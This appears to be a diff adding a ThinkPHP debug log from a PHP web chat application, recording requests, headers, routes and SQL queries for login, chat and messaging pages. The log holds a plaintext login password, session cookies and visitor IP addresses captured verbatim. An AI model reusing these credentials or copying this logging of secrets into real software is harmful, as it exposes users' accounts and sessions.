+  'cookie' => 'PHPSESSID=0eeaqgkq1hc4m2nq9p9ke3tbh2; CUID=vZ7%3D6',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\chat\home_page.html [ array (
+  0 => 'client_id',
+  1 => 'client_img',
+  2 => 'client_name',
+  3 => 'clients',
+  4 => 'today_mess',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001152s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006753s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000800s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000591s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` [ RunTime:0.000643s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000566s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000590s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000581s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000548s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000546s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000543s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000560s ]
+---------------------------------------------------------------
+[ 2017-07-30T19:15:03+08:00 ] 0.0.0.0 61.242.61.60 POST /home/chat/bind.html
+[ info ] eddchat.oumaikeji.com/home/chat/bind.html [运行时间：0.104319s][吞吐率：9.59req/s] [内存消耗：3,426.07kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'bind',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '50',
+  'x-original-url' => '/home/chat/bind.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=0eeaqgkq1hc4m2nq9p9ke3tbh2; CUID=qOZJ1',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa00000000c',
+  'client_name' => 'client2',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->bind[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.010979s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006327s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000724s ]
+[ sql ] [ SQL ] SELECT `avatar`,`user_login` FROM `edd_users` WHERE  `user_login` = 'client2' [ RunTime:0.000569s ]
+---------------------------------------------------------------
+[ 2017-07-30T19:15:04+08:00 ] 0.0.0.0 61.242.61.60 GET /home/chat/favicon.png
+[ info ] eddchat.oumaikeji.com/home/chat/favicon.png [运行时间：0.083163s][吞吐率：12.02req/s] [内存消耗：3,454.52kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'favicon.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/favicon.png',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=0eeaqgkq1hc4m2nq9p9ke3tbh2; CUID=1-yyz',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001120s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.025564s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000731s ]
+---------------------------------------------------------------
+[ 2017-07-30T19:15:12+08:00 ] 0.0.0.0 61.242.61.60 POST /home/chat/send_message.html
+[ info ] eddchat.oumaikeji.com/home/chat/send_message.html [运行时间：0.093152s][吞吐率：10.74req/s] [内存消耗：3,434.60kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'send_message',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '34',
+  'x-original-url' => '/home/chat/send_message.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=0eeaqgkq1hc4m2nq9p9ke3tbh2; CUID=nyYId',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'self_name' => 'client2',
+  'msg' => '...',
+  'type' => 'all',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->send_message[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.014765s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.011373s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000725s ]
+[ sql ] [ SQL ] SELECT `avatar`,`id` FROM `edd_users` WHERE  `user_login` = 'client2' [ RunTime:0.000550s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_mess` [ RunTime:0.005958s ]
+[ sql ] [ SQL ] INSERT INTO `edd_mess` (`mess_date` , `from_client_id` , `to_client_id` , `content`) VALUES ('1501413312' , 56 , 0 , '...') [ RunTime:0.000559s ]
+---------------------------------------------------------------
+[ 2017-07-30T19:15:32+08:00 ] 0.0.0.0 61.242.61.60 GET /home/chat/login_out.html
+[ info ] eddchat.oumaikeji.com/home/chat/login_out.html [运行时间：0.088970s][吞吐率：11.24req/s] [内存消耗：3,513.95kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'login_out',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/login_out.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=0eeaqgkq1hc4m2nq9p9ke3tbh2; CUID=XjdeH',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->login_out[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006699s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006286s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000721s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000564s ]
+---------------------------------------------------------------
+[ 2017-07-30T19:15:32+08:00 ] 0.0.0.0 61.242.61.60 GET /home/login/home_page.html
+[ info ] eddchat.oumaikeji.com/home/login/home_page.html [运行时间：0.047587s][吞吐率：21.01req/s] [内存消耗：2,486.58kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/login/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=0eeaqgkq1hc4m2nq9p9ke3tbh2',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T19:15:32+08:00 ] 0.0.0.0 110.188.255.184 POST /home/chat/find_client_name.html
+[ info ] eddchat.oumaikeji.com/home/chat/find_client_name.html [运行时间：0.118333s][吞吐率：8.45req/s] [内存消耗：3,409.66kb] [文件加载：60]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'find_client_name',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '30',
+  'x-original-url' => '/home/chat/find_client_name.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'UID=19vLz; PHPSESSID=21mjc3995388v4d4l6n4ocmqd0; CUID=uSF2j',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa00000000c',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->find_client_name[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.010128s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.004979s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000781s ]
+---------------------------------------------------------------
+[ 2017-07-30T19:15:32+08:00 ] 0.0.0.0 61.242.61.60 GET /home/login/favicon.ico
+[ info ] eddchat.oumaikeji.com/home/login/favicon.ico [运行时间：0.040486s][吞吐率：24.70req/s] [内存消耗：2,437.44kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'favicon.ico',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/login/favicon.ico',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/login/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=0eeaqgkq1hc4m2nq9p9ke3tbh2',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T20:55:19+08:00 ] 0.0.0.0 207.46.13.200 GET /robots.txt
+[ info ] eddchat.oumaikeji.com/robots.txt [运行时间：0.036158s][吞吐率：27.66req/s] [内存消耗：1,854.16kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'robots.txt',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/robots.txt',
+  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T20:55:23+08:00 ] 0.0.0.0 157.55.39.80 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.060790s][吞吐率：16.45req/s] [内存消耗：2,493.88kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T20:59:55+08:00 ] 0.0.0.0 153.99.17.178 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.045450s][吞吐率：22.00req/s] [内存消耗：2,495.11kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T20:59:55+08:00 ] 0.0.0.0 153.99.17.178 GET /favicon.ico
+[ info ] eddchat.oumaikeji.com/favicon.ico [运行时间：0.034397s][吞吐率：29.07req/s] [内存消耗：1,854.46kb] [文件加载：41]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/favicon.ico',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=002nq4pq8j8uhgc0mf8dnsitr6',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T21:00:30+08:00 ] 0.0.0.0 153.99.17.178 POST /home/login/login_think.html
+[ info ] eddchat.oumaikeji.com/home/login/login_think.html [运行时间：0.081014s][吞吐率：12.34req/s] [内存消耗：3,540.50kb] [文件加载：64]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'login',
+    2 => 'login_think',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '34',
+  'x-original-url' => '/home/login/login_think.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=002nq4pq8j8uhgc0mf8dnsitr6',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'client',
+  'password' => 'client123',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->login_think[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ CACHE ] INIT File
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001970s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005922s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `user_login` = 'client' LIMIT 1 [ RunTime:0.000760s ]
+[ sql ] [ SQL ] UPDATE `edd_users`  SET `last_login_time`='1501419630',`last_login_ip`='153.99.17.178',`user_hits`=26  WHERE  `id` = 54 [ RunTime:0.000660s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:00:31+08:00 ] 0.0.0.0 153.99.17.178 GET /home/chat/home_page.html
+[ info ] eddchat.oumaikeji.com/home/chat/home_page.html [运行时间：0.168328s][吞吐率：5.94req/s] [内存消耗：3,562.34kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://eddchat.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=002nq4pq8j8uhgc0mf8dnsitr6; CUID=tFIWe',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\chat\home_page.html [ array (
+  0 => 'client_id',
+  1 => 'client_img',
+  2 => 'client_name',
+  3 => 'clients',
+  4 => 'today_mess',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.011862s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005941s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000709s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000564s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` [ RunTime:0.000622s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000554s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000592s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000533s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000530s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000527s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000526s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000522s ]
+---------------------------------------------------------------
+[ 2017-07-30T21:00:31+08:00 ] 0.0.0.0 153.99.17.178 GET /home/chat/favicon.png
+[ info ] eddchat.oumaikeji.com/home/chat/favicon.png [运行时间：0.071431s][吞吐率：14.00req/s] [内存消耗：3,454.11kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'favicon.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/favicon.png',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=002nq4pq8j8uhgc0mf8dnsitr6; CUID=W9dtr',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.009286s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
